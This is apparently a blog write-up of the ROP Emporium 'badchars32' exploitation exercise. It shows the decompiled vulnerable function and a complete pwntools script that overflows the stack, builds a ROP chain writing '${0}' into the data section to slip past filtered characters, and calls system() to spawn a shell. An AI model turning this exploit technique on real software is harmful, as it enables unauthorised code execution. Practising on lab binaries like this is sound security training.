---
layout: post
title: ROP Emporium - badchars32
---

### Instruction
An arbitrary write challenge with a twist; certain input characters get mangled before finding their way onto the stack. Find a way to deal with this and craft your exploit.

### Prev step to overflow stack
<https://bhrdn.github.io/ROP-Emporium-ret2win32/>

### Prev step to find data-section addr and gadgets
<https://bhrdn.github.io/ROP-Emporium-write432/>

### Check vuln function
```c
void pwnme(void)
{
  char *__s;
  size_t __n;
  undefined auStack44[40];
  
  __s = (char *)malloc(0x200);
  if (__s != (char *)0x0) {
    memset(__s, 0, 0x200);
    memset(auStack44, 0, 0x20);
    puts("badchars are: b i c / <space> f n s");
    printf("> ");
    __s = fgets(__s, 0x200, stdin);
    __n = nstrlen(__s, 0x200);
    checkBadchars(__s, __n);
    memcpy(auStack44, __s, __n);
    free(__s);
    return;
  }

  exit(1);
}
```

### XOR function to bypass badchars
```c
void usefulGadgets(void)
{
  byte in_CL;
  byte *unaff_EBX;
  
  *unaff_EBX = *unaff_EBX ^ in_CL;
  return;
}
```

### Why not bypass badchars with bash special params 💃💃
- Badchars: [ 'b', 'i', 'c', '/', ' ', 'f', 'n', 's' ]

```c
#include <stdio.h>

int main()
{
    system("$0");
    return 0;
}
```
- Reference: <https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html>

### Payload
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('badchars32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

payload = '\x90' * cyclic_find('laaa')
command = '${0}'

DATA_START = 0x804a038

## gadgets to write datas
POP_ESI_POP_EDI = 0x08048899
MOV_EDI_ESI = 0x08048893

rop = ROP(exe)
rop.raw(POP_ESI_POP_EDI)
rop.raw(command)
rop.raw(DATA_START)
rop.raw(MOV_EDI_ESI)

rop.system(DATA_START)

io.sendline(payload + rop.__str__())
io.interactive()
```